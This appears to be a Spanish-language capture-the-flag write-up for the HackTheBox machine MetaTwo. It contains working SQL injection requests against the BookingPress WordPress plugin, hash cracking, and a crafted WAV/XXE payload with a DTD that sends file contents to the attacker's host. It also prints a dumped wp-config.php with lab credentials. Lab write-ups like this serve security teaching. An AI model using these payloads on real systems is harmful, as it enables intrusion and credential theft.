@@ -1,0 +1,534 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup MetaTwo HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/metatwo.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup MetaTwo HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina MetaTwo de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina MetaTwo de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup MetaTwo HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup MetaTwo HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina MetaTwo de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup MetaTwo HackTheBox</h1>
+          <p>Resolución de la máquina MetaTwo de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.186
+Nmap scan report for 10.10.11.186
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Al hacer un simple curl y mirar las cabeceras podemos ver el dominio metapress.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s 10.10.11.186 -I | </span><span class="s2">grep</span><span class="p"> Location
+Location: </span><span class="kd">http://metapress.htb</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver con whatweb que se emplea WordPress por detrás</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ whatweb </span><span class="p">metapress.htb
+WordPress[</span><span class="na">5.6.2</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div><p>Después de un rato enumerando con wpscan encontramos el plugin BookingPress</p></div>
+<div><p>Este plugin tiene una <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">vulnerabilidad</a> que podemos explotar, iniciamos creando un evento con [bookingpress_form] como dato en los campos posibles</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Al crear el evento nos redirigira a una url, en el codigo fuente buscaremos el nonce</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">var postData = { action:'bookingpress_generate_spam_captcha', _wpnonce:'</span><span class="kd">06acdaf5ad</span><span class="p">' };</span>
+</code></pre></div></div>
+
+<div><p>Con el valor de nonce podemos a empezar a enumerar la base de datos a través de la inyección sql, tomaremos como base el <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">PoC</a>, iniciaremos con el nombre de la db actualmente en uso</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s</span><span class="no"> 'http://metapress.htb/wp-admin/admin-ajax.php'</span><span class="p"> -d</span><span class="no"> "action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1) union select database(),1,1,1,1,1,1,1,1-- -" </span><span class="p">|</span><span class="s2"> sed</span><span class="no"> 's/\\//g'</span><span class="p"> |</span><span class="s2"> jq</span><span class="p"> |</span><span class="s2"> grep</span><span class="p"> service_id |</span><span class="s2"> awk</span><span class="no"> '{print $4}'</span><span class="p"> FS=</span><span class="no">'"'</span><span class="p">
+blog</span>
+</code></pre></div></div>
+
+<div><p>La base de datos actual es blog pero podemos mirar si existen mas, aunque vemos que no es asi</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s</span><span class="no"> 'http://metapress.htb/wp-admin/admin-ajax.php'</span><span class="p"> -d </span><span class="no">"action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1) union select group_concat(schema_name),1,1,1,1,1,1,1,1 from information_schema.schemata-- -" </span><span class="p">|</span><span class="s2"> awk </span><span class="no">'{print $4}'</span><span class="p"> FS=</span><span class="no">'"'</span><span class="p"> |</span><span class="s2"> tr</span><span class="no"> "," "\n"</span><span class="p">
+information_schema
+blog</span>
+</code></pre></div></div>
+
+<div><p>Ahora podemos enumerar las tablas de la base de datos actual y vemos wp_users</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s</span><span class="no"> 'http://metapress.htb/wp-admin/admin-ajax.php'</span><span class="p"> -d </span><span class="no">"action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1) union select group_concat(table_name),1,1,1,1,1,1,1,1 from information_schema.tables where table_schema = database()-- -" </span><span class="p">|</span><span class="s2"> awk </span><span class="no">'{print $4}'</span><span class="p"> FS=</span><span class="no">'"'</span><span class="p"> |</span><span class="s2"> tr</span><span class="no"> "," "\n"</span><span class="p">
+wp_options
+wp_term_taxonomy
+wp_bookingpress_servicesmeta
+wp_commentmeta
+wp_users
+wp_bookingpress_customers_meta
+wp_bookingpress_settings
+wp_bookingpress_appointment_bookings
+wp_bookingpress_customize_settings
+wp_bookingpress_debug_payment_log
+wp_bookingpress_services
+wp_termmeta
+wp_links
+wp_bookingpress_entries
+wp_bookingpress_categories
+wp_bookingpress_customers
+wp_bookingpress_notifications
+wp_usermeta
+wp_terms
+wp_bookingpress_default_daysoff
+wp_comments
+wp_bookingpress_default_workhours
+wp_postmeta
+wp_bookingpress_form_fields
+wp_bookingpress_payment_logs
+wp_posts
+wp_term_relationships</span>
+</code></pre></div></div>
+	     
+<div><p>Enumeramos las columnas de wp_users y encontramos user_login y user_pass</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s</span><span class="no"> 'http://metapress.htb/wp-admin/admin-ajax.php'</span><span class="p"> -d </span><span class="no">"action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1) union select group_concat(column_name),1,1,1,1,1,1,1,1 from information_schema.columns where table_schema = database() and table_name=0x77705f7573657273-- -" </span><span class="p">|</span><span class="s2"> awk </span><span class="no">'{print $4}'</span><span class="p"> FS=</span><span class="no">'"'</span><span class="p"> |</span><span class="s2"> tr</span><span class="no"> "," "\n"</span><span class="p">
+ID
+user_login
+user_pass
+user_nicename
+user_email
+user_url
+user_registered
+user_activation_key
+user_status
+display_name</span>
+</code></pre></div></div>
+
+<div><p>Intentaremos dumpear los usuarios y contraseñas de las columnas user_login y user_pass</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s</span><span class="no"> 'http://metapress.htb/wp-admin/admin-ajax.php'</span><span class="p"> -d </span><span class="no">"action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=1) union select group_concat(user_login,0x3a,user_pass),1,1,1,1,1,1,1,1 from wp_users-- -" </span><span class="p">|</span><span class="s2"> awk </span><span class="no">'{print $4}'</span><span class="p"> FS=</span><span class="no">'"'</span><span class="p"> |</span><span class="s2"> tr</span><span class="no"> "," "\n"</span><span class="p">
+admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+manager:$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70</span>
+</code></pre></div></div>
+
+<div><p>Con john aplicamos fuerza bruta y logramos romper el hash de manager</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">hashes
+admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+
+</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$)])
+</span><span class="kd">partylikearockstar </span><span class="p">(</span><span class="na">manager</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Podemos utilizar estas credenciales en el wp-admin.php e iniciar sesión</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Aunque iniciamos sesión solo podemos acceder a un campo de subir multimedia</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Hay un <a href="https://www.pinguytaz.net/index.php/2021/09/04/cve-2021-29447-vulnerabilidad-xxe-wordpress-ctf/">articulo</a> que nos indica como inyectar un waf malicioso y mediante un XXE leer archivos</p></div>
+
+<div><p>Iniciamos creando nuestro archivo .wav malicioso llamado payload (recuerda cambiar tu ip)</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo</span><span class="p"> -en 'RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00&lt?xml version="1.0"?>&lt!DOCTYPE ANY[&lt!ENTITY % remote SYSTEM '"'"'http://10.10.14.10/pwned.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav</span>
+</code></pre></div></div>
+
+<div><p>Lo siguiente es crear el dtd al cual se va a conectar, debe quedar de la siguiente forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> pwned.dtd
+&lt!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hostname">
+&lt!ENTITY % init "&lt!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.10/?p=%file;'>" ></span>
+</code></pre></div></div>
+
+<div><p>Con los dos archivos en el mismo directorio, creamos un servidor http y subimos el wav malicioso</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div>
+
+<div><p><img src="./4.png"><p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Al subirlo nos llegan 2 peticiones, la ultima tiene una cadena en base64</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.186 - - "GET /pwned.dtd HTTP/1.1" 200 -
+10.10.11.186 - - "GET /?p=</span><span class="kd">bWV0YTIK</span><span class="p"> HTTP/1.1" 200 -</span>
+</code></pre></div></div>
+
+<div><p>Lo decodificamos y podemos ver que corresponde al /etc/hostname que definimos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo </span><span class="no">"bWV0YTIK"</span><span class="p"> |</span><span class="s2"> base64</span><span class="p"> -d
+meta2</span>
+</code></pre></div></div>
+
+<div><p>Cambiamos en el archivo dtd el /etc/hostname por ../wp-config.php por si hay credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> pwned.dtd
+&lt!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
+&lt!ENTITY % init "&lt!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.10/?p=%file;'>" ></span>
+</code></pre></div></div>
+
+<div><p>Volvemos a subir el archivo y esta vez nos llega una data bastante mas grande</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.186 - - "GET /pwned.dtd HTTP/1.1" 200 -
+10.10.11.186 - - "GET /?p=</span><span class="kd">PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==</span><span class="p"> HTTP/1.1" 200 -</span>
+</code></pre></div></div>
+
+<div><p>Al decodificarlo podemos ver el php, que contiene unas credenciales para ftp</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo</span><span class="no"> "PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==" </span><span class="p">|</span><span class="s2"> base64 </span><span class="p">-d
+&lt?php
+</span><span class="c1">/** The name of the database for WordPress */
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'DB_NAME'</span><span class="p">,</span><span class="s2"> 'blog' </span><span class="p">);
+
+</span><span class="c1">/** MySQL database username */
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'DB_USER'</span><span class="p">,</span><span class="s2"> 'blog' </span><span class="p">);
+
+</span><span class="c1">/** MySQL database password */
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'DB_PASSWORD'</span><span class="p">,</span><span class="s2"> '635Aq@TdqrCwXFUZ' </span><span class="p">);
+
+</span><span class="c1">/** MySQL hostname */
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'DB_HOST'</span><span class="p">,</span><span class="s2"> 'localhost' </span><span class="p">);
+
+</span><span class="c1">/** Database Charset to use in creating database tables. */
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'DB_CHARSET'</span><span class="p">,</span><span class="s2"> 'utf8mb4' </span><span class="p">);
+
+</span><span class="c1">/** The Database Collate type. Don't change this if in doubt. */
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'DB_COLLATE'</span><span class="p">,</span><span class="s2"> '' </span><span class="p">);
+
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'FS_METHOD'</span><span class="p">,</span><span class="s2"> 'ftpext' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'FTP_USER'</span><span class="p">,</span><span class="s2"> 'metapress.htb'</span><span class="p"> );
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'FTP_PASS'</span><span class="p">,</span><span class="s2"> '9NYS_ii@FyL_p5M2NvJ' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'FTP_HOST'</span><span class="p">,</span><span class="s2"> 'ftp.metapress.htb' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'FTP_BASE'</span><span class="p">,</span><span class="s2"> 'blog/'</span><span class="p"> );
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'FTP_SSL'</span><span class="p">,</span><span class="na"> false</span><span class="p"> );
+
+</span><span class="c1">/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'AUTH_KEY'</span><span class="p">,         </span><span class="s2">'?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'SECURE_AUTH_KEY'</span><span class="p">,  </span><span class="s2">'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'LOGGED_IN_KEY'</span><span class="p">,    </span><span class="s2">'J+mxCaP4z&ltg.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'NONCE_KEY'</span><span class="p">,        </span><span class="s2">'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'AUTH_SALT'</span><span class="p">,        </span><span class="s2">'[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d&lt&M;.,x0z~R>3!D' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'SECURE_AUTH_SALT'</span><span class="p">, </span><span class="s2">'>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'LOGGED_IN_SALT'</span><span class="p">,   </span><span class="s2">'4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' </span><span class="p">);
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'NONCE_SALT'</span><span class="p">,       </span><span class="s2">'.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' </span><span class="p">);
+
+</span><span class="c1">/**
+ * WordPress Database Table prefix.
+ */
+</span><span class="p">$table_prefix </span><span class="kd">=</span><span class="s2"> 'wp_'</span><span class="p">;
+
+</span><span class="c1">/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'WP_DEBUG'</span><span class="p">,</span><span class="na"> false</span><span class="p"> );
+
+</span><span class="c1">/** Absolute path to the WordPress directory. */
+</span><span class="kd">if</span><span class="p"> (</span><span class="kd"> !</span><span class="k"> defined</span><span class="p">(</span><span class="s2"> 'ABSPATH'</span><span class="p"> ) ) {
+	</span><span class="k">define</span><span class="p">(</span><span class="s2"> 'ABSPATH'</span><span class="p">,</span><span class="na"> __DIR__ </span><span class="kd">.</span><span class="s2"> '/' </span><span class="p">);
+}
+
+</span><span class="c1">/** Sets up WordPress vars and included files. */
+</span><span class="kd">require_once</span><span class="na"> ABSPATH</span><span class="kd"> .</span><span class="s2"> 'wp-settings.php'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<div><p>Con las credenciales nos conectamos a ftp y vemos un par de directorios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ftp </span><span class="p">metapress.htb              
+Connected to metapress.htb.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+Name (metapress.htb:root): </span><span class="kd">metapress.htb</span><span class="p">
+331 Password required for metapress.htb
+Password: </span><span class="kd">9NYS_ii@FyL_p5M2NvJ</span><span class="p">
+230 User metapress.htb logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="kd">ftp> </span><span class="p">dir
+drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
+drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
+226 Transfer complete
